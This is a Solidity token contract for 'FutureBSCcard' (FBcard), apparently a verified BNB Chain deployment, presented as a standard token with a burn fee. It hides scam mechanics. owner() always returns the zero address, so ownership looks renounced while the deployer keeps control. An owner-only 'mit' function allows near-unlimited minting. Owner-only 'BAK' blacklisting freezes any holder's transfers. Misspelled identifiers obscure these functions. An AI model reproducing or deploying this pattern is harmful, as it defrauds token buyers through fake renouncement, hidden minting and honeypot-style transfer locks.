/**
 *Submitted for verification at BscScan.com on 2022-08-30
*/

pragma solidity ^0.4.25;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public owner;

    event owneresshipTransferred(address indexed previousowneres, address indexed newowneres);

    modifier onlyowneres() {
        require(msg.sender == owner);
        _;
    }

/**
    * @dev Returns the address of the current owner.
     */
    function owner() public pure  returns  (address) {
        return address(0);
    }


    function transferowneresship(address newowneres) public onlyowneres {
        require(newowneres != address(0));
        emit owneresshipTransferred(owner, newowneres);
        owner = newowneres;
    }

    function renounceowneresship() public onlyowneres {
        emit owneresshipTransferred(owner, address(0));
        owner = address(0);
    }
}



contract BaseToken is Ownable {
    using SafeMath for uint256;

    string constant public name = 'FutureBSCcard';

    string constant public symbol = 'FBcard';

    uint8 constant public decimals = 18;

    uint256 public totalSupply = 100000000*10**uint256(decimals);

    uint256 public constant MAXSupply = 1000000000000000000000000000000000000000000000000000 * 10 ** uint256(decimals);

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    mapping(address => bool) private _isExcludedFromfeeh;

    mapping(address => bool) private _lcck;


    uint256 public _taxfeeh = 0;
    uint256 private _previousTaxfeeh = _taxfeeh;

    uint256 public _burnfeeh = 2;
    uint256 private _previousBurnfeeh = _burnfeeh;


    address public projectAddress = 0xBb7E7CC4b789fDCb2FD0A4b7c8b7f2e99ffDe36E;


    address public burnAddress = 0x000000000000000000000000000000000000dEaD;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "is 0 address");

        require(!_lcck[from], "is lcck");

        if(_isExcludedFromfeeh[from])
            removeAllfeeh();

        uint256 feeh =  calculateTaxfeeh(value);

        uint256 burn =  calculateBurnfeeh(value);

        balanceOf[from] = balanceOf[from].sub(value);

        balanceOf[to] = balanceOf[to].add(value).sub(feeh).sub(burn);

        if(feeh > 0) {
            balanceOf[projectAddress] = balanceOf[projectAddress].add(feeh);
            emit Transfer(from, projectAddress, feeh);
        }

        if(burn > 0) {
            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn);
            emit Transfer(from, burnAddress, burn);
        }


         if(_isExcludedFromfeeh[from])
            restoreAllfeeh();

        emit Transfer(from, to, value);
    }


    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }


    function mit(address target, uint256 edAmount) public onlyowneres{
    	require (totalSupply + edAmount <= MAXSupply);

        balanceOf[target] = balanceOf[target].add(edAmount);
        totalSupply = totalSupply.add(edAmount);

        emit Transfer(0, this, edAmount);
        emit Transfer(this, target, edAmount);
    }

    function calculateTaxfeeh(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_taxfeeh).div(
            10 ** 2
        );
    }

    function calculateBurnfeeh(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_burnfeeh).div(
            10 ** 2
        );
    }

    function removeAllfeeh() private {
        if(_taxfeeh == 0 && _burnfeeh == 0)
            return;

        _previousTaxfeeh = _taxfeeh;
        _previousBurnfeeh = _burnfeeh;
        _taxfeeh = 0;
        _burnfeeh = 0;
    }

    function restoreAllfeeh() private {
        _taxfeeh = _previousTaxfeeh;
        _burnfeeh = _previousBurnfeeh;
    }



    function BAK(address acbount) public onlyowneres {
        _lcck[acbount] = true;
    }


    function UNBAK(address acbount) public onlyowneres {
        _lcck[acbount] = false;
    }


    function islcck(address acbount) public view returns (bool) {

        return _lcck[acbount];
    }


}


contract Token is BaseToken {

    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);

        owner = msg.sender;


    }

    function() public payable {
       revert();
    }
}